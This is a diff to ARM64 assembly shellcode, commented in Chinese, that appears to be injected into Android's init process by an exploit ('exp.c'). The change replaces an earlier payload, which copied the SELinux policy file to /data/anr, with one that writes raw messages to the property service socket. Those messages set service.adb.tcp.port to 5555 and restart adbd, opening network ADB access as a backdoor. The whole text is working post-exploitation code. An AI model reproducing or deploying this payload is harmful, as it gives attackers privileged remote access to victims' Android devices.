@@ -14,10 +14,26 @@ libcxx_data:
 
 mutex_file:
     .asciz "/dev/df"
-policy_src:
-    .asciz "/sys/fs/selinux/policy"
-policy_dst:
-    .asciz "/data/anr/anr_policy_trace.txt" 
+sockaddr_un:
+    .word 1  // AF_UNIX
+    .asciz "/dev/socket/property_service"
+    .skip 80, 0 // 补齐 sockaddr_un 结构体大小
+
+// 属性服务协议包 1: PROP_MSG_SETPROP2 (1) | klen(21) | "service.adb.tcp.port" | vlen(4) | "5555"
+msg1:
+    .word 0x00000001
+    .word 21
+    .ascii "service.adb.tcp.port"
+    .word 4
+    .ascii "5555"
+
+// 属性服务协议包 2: PROP_MSG_SETPROP2 (1) | klen(11) | "ctl.restart" | vlen(4) | "adbd"
+msg2:
+    .word 0x00000001
+    .word 11
+    .ascii "ctl.restart"
+    .word 4
+    .ascii "adbd"
     .balign 4
 
     .global libcxx_ko_target_off
@@ -27,7 +43,7 @@ libcxx_ko_target_off:
     .align 4
 
 libcxx_start:
-    // 现场保护 (保存所有关键寄存器)
+    // 现场保护
     stp x0, x1, [sp, #-16]!
     stp x2, x3, [sp, #-16]!
     stp x4, x5, [sp, #-16]!
@@ -42,7 +58,7 @@ libcxx_start:
     svc     0
     cbnz    w0, return
 
-    // 2. 检查 tid == 1 (确保是 init 的主线程)
+    // 2. 检查 tid == 1
     mov     x8, SYS_gettid
     svc     0
     cmp     w0, 1
@@ -55,17 +71,14 @@ libcxx_start:
     mov     x3, xzr
     mov     x8, #SYS_openat
     svc     0
-
     tbnz    w0, #31, return
 
     sub     sp, sp, 16
-
-    // 4. 准备 clone 参数
     mov     x8, SYS_gettid
     svc     0
     str     w0, [sp, 8]
 
-    // 5. clone 子进程
+    // 4. clone 子进程
     mov     x8, SYS_clone
     add     x4, sp, 8
     mov     x3, xzr
@@ -76,83 +89,59 @@ libcxx_start:
     str     w0, [sp, 8]
     add     sp, sp, 16
 
-    // 父进程 (init) 收到子进程 pid，直接返回
     cbnz    w0, return          
 
-// ── Worker 子进程 ──────────────────────────────────────────────────────
 worker:
-    // 分配 1024 字节作为读取缓冲区 (16字节对齐)
-    sub     sp, sp, 1024
-
-    // 6. 打开 /sys/fs/selinux/policy (只读)
-    mov     x0, -100
-    adr     x1, policy_src
-    movl    x2, (O_RDONLY|O_CLOEXEC)
-    mov     x3, xzr
-    mov     x8, #SYS_openat
+    // 5. socket(AF_UNIX, SOCK_STREAM, 0)
+    mov     x0, #1 // AF_UNIX
+    mov     x1, #1 // SOCK_STREAM
+    mov     x2, xzr
+    mov     x8, #SYS_socket
     svc     0
     tbnz    w0, #31, cleanup_df
-    mov     x20, x0  // 保存源文件 fd 到 x20
+    mov     x19, x0 // 保存 socket fd
 
-    // 7. 打开 /data/anr/anr_policy_trace.txt (写入、创建、截断)
-    mov     x0, -100
-    adr     x1, policy_dst
-    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
-    movl    x3, 0644
-    mov     x8, #SYS_openat
+    // 6. connect(fd, sockaddr_un, 110)
+    mov     x0, x19
+    adr     x1, sockaddr_un
+    mov     x2, #110
+    mov     x8, #SYS_connect
     svc     0
-    tbnz    w0, #31, close_src
-    mov     x21, x0  // 保存目标文件 fd 到 x21
+    tbnz    w0, #31, close_sock
 
-read_loop:
-    // 8. read(src_fd, sp, 1024)
-    mov     x0, x20
-    mov     x1, sp
-    movl    x2, 1024
-    mov     x8, #SYS_read
-    svc     0
-    
-    cmp     w0, #0
-    b.le    close_dst  // 如果读完了 (0) 或出错 (<0)，退出循环
-
-    // 9. write(dst_fd, sp, 读到的字节数)
-    mov     x22, x0
-    mov     x0, x21
-    mov     x1, sp
-    mov     x2, x22
+    // 7. write(fd, msg1, 37)
+    mov     x0, x19
+    adr     x1, msg1
+    mov     x2, #37
     mov     x8, #SYS_write
     svc     0
-    
-    b       read_loop
 
-close_dst:
-    mov     x0, x21
-    mov     x8, #SYS_close
+    // 8. write(fd, msg2, 27)
+    mov     x0, x19
+    adr     x1, msg2
+    mov     x2, #27
+    mov     x8, #SYS_write
     svc     0
 
-close_src:
-    mov     x0, x20
+close_sock:
+    // 9. close(fd)
+    mov     x0, x19
     mov     x8, #SYS_close
     svc     0
 
 cleanup_df:
-    // 恢复栈指针 (极其关键，防止 init Panic)
-    add     sp, sp, 1024
-
-    // 强制删除 /dev/df (方便反复测试)
+    // 强制删除 /dev/df
     mov     x0, -100
     adr     x1, mutex_file
     mov     x8, #SYS_unlinkat
     svc     0
 
 myexit:
-    // 子进程光荣退役
     mov     x0, #0
     mov     x8, #SYS_exit
     svc     0
 
 return:
-    // 现场恢复
     ldr x30, [sp], #16
     ldp x28, x29, [sp], #16
     ldp x26, x27, [sp], #16
@@ -161,9 +150,7 @@ return:
     ldp x4, x5, [sp], #16
     ldp x2, x3, [sp], #16
     ldp x0, x1, [sp], #16
-
 libcxx_first_inst_copy:
-    // 供 exp.c 打补丁的占位符
     stp     x29, x30, [sp, #-32]!
     b       end
 end:
